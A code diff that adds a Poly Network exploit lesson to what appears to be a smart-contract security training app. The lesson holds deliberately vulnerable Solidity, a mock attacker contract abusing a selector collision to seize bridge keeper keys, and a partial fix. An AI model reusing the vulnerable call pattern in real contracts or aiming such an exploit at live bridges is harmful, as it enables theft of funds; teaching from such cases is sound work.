@@ -980,5 +980,146 @@ contract FixedDEX {
             'https://ethereum.org/en/developers/docs/mev/',
             'https://swcregistry.io/docs/SWC-114'
         ]
+    },
+    {
+        id: 'poly-network',
+        title: 'Poly Network Exploit',
+        description: 'The $610M hack: Method Signature Hash Collision & Access Control Bypass',
+        difficulty: 'expert',
+        category: 'Cryptography & Access Control',
+        isRealWorld: true,
+        loss: '$611 Million',
+        date: 'August 10, 2021',
+        vulnerableCode: `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IEthCrossChainData {
+    function putCurEpochConPubKeyBytes(bytes memory curEpochPkBytes) external returns (bool);
+}
+
+contract EthCrossChainManager {
+    address public owner;
+    address public eccd; // EthCrossChainData address
+
+    constructor(address _eccd) {
+        owner = msg.sender;
+        eccd = _eccd;
     }
-]
+
+    // Critical Vulnerability: Arbitrary external call with user-controlled data
+    function _executeCrossChainTx(
+        address _toContract, 
+        bytes memory _method, 
+        bytes memory _args, 
+        bytes memory _fromContractAddr, 
+        uint64 _fromChainId
+    ) internal returns (bool) {
+        // ... internal checks ...
+
+        // 1. Constructs selector from _method string
+        bytes4 selector = bytes4(keccak256(abi.encodePacked(_method, "(bytes,bytes,uint64)")));
+        
+        // 2. Encodes calling arguments
+        bytes memory callData = abi.encodePacked(
+            selector,
+            abi.encode(_args, _fromContractAddr, _fromChainId)
+        );
+
+        // 3. Performs raw call to _toContract
+        // FLAW: If we can find a collision for 'putCurEpochConPubKeyBytes', 
+        // we can call it on the ECCD contract!
+        (bool success, ) = _toContract.call(callData);
+        require(success, "Call failed");
+        
+        return true;
+    }
+    
+    // Public wrapper to simulate the cross-chain trigger
+    function verifyHeaderAndExecuteTx(
+        address toContract, 
+        bytes memory method, 
+        bytes memory args, 
+        bytes memory fromContract, 
+        uint64 fromChainId
+    ) public {
+        _executeCrossChainTx(toContract, method, args, fromContract, fromChainId);
+    }
+}`,
+        attackCode: `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attacker {
+    // The target "EthCrossChainData" contract we want to hijack
+    address public constant ECCD_ADDRESS = 0x123...; // Mock address
+    
+    // This valid function signature:
+    // "putCurEpochConPubKeyBytes(bytes)" 
+    // ...has the selector: 0x41973cd9
+    
+    // We found a collision!
+    // "f1121318093(bytes,bytes,uint64)"
+    // ...also generates the selector: 0x41973cd9
+    
+    // But wait, the manager appends "(bytes,bytes,uint64)" automatically.
+    // So we just need a method name "f1121318093"
+    
+    function exploit(address manager) public {
+        // Malicious Payload: The new Keeper Public Keys (controlled by us)
+        bytes memory newKeepers = abi.encodePacked(address(this));
+        
+        // Call the manager with the collision string
+        EthCrossChainManager(manager).verifyHeaderAndExecuteTx(
+            ECCD_ADDRESS,           // Target: The Data Contract
+            bytes("f1121318093"),   // Method: The Collision String
+            newKeepers,            // Args: Our malicious key data
+            bytes(""),             // FromContract: Irrelevant
+            1                      // FromChainId: Irrelevant
+        );
+        
+        // Result: The Data contract now thinks WE are the consensus keepers!
+    }
+}`,
+        fixedCode: `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract FixedManager {
+    // ... 
+    
+    function _executeCrossChainTx(
+        address _toContract, 
+        bytes memory _method, 
+        bytes memory _args, 
+        bytes memory _fromContractAddr, 
+        uint64 _fromChainId
+    ) internal returns (bool) {
+        
+        // FIX 1: Whitelist specific contracts
+        require(validContracts[_toContract], "Contract not allowed");
+        
+        // FIX 2: Pre-calculate selectors or use an interface
+        // Don't construct selectors dynamically from user input
+        
+        // FIX 3: Prevent calls to critical infrastructure
+        require(_toContract != address(eccd), "Cannot call Data Contract");
+
+        // ... logic ...
+    }
+}`,
+        explanation: 'The Poly Network exploit was made possible by a rare "Method ID Collision" combined with excessive privileges. The attacker crafted a function name that, when hashed, produced the exact same 4-byte selector as the function used to change the network keepers. The CrossChainManager blindly executed this call against the critical CrossChainData contract.',
+        vulnerability: 'The `_executeCrossChainTx` function dynamically computed function selectors from user input and executed calls against any target, including the privileged Data contract.',
+        impact: 'The attacker overwrote the consensus public keys (keepers), taking full control of the bridge and draining over $610 million in assets.',
+        prevention: 'Never allow users to specify arbitrary contract calls to critical infrastructure. Use strict whitelisting and avoid dynamic selector generation for privileged operations.',
+        references: [
+            'https://www.certik.com/resources/blog/poly-network-exploit',
+            'https://research.kudelskisecurity.com/2021/08/12/the-poly-network-hack-explained/',
+            'https://slowmist.medium.com/the-root-cause-of-poly-network-being-hacked-ec2ee1b0c68f'
+        ],
+        images: [
+            'https://miro.medium.com/v2/resize:fit:1100/format:webp/0*AFH0BDeTCzycH3ri',
+            'https://miro.medium.com/v2/resize:fit:1100/format:webp/0*zqJemzaZsmXjIsl4',
+            'https://miro.medium.com/v2/resize:fit:1100/format:webp/0*NwO5WBTMbJAeVcZO',
+            'https://miro.medium.com/v2/resize:fit:1100/format:webp/0*yD5fzjcK4iv8Qjoc',
+            'https://miro.medium.com/v2/resize:fit:1100/format:webp/1*afiS7T9PJ-T8AblqdX92Kg.png'
+        ]
+    }
+];
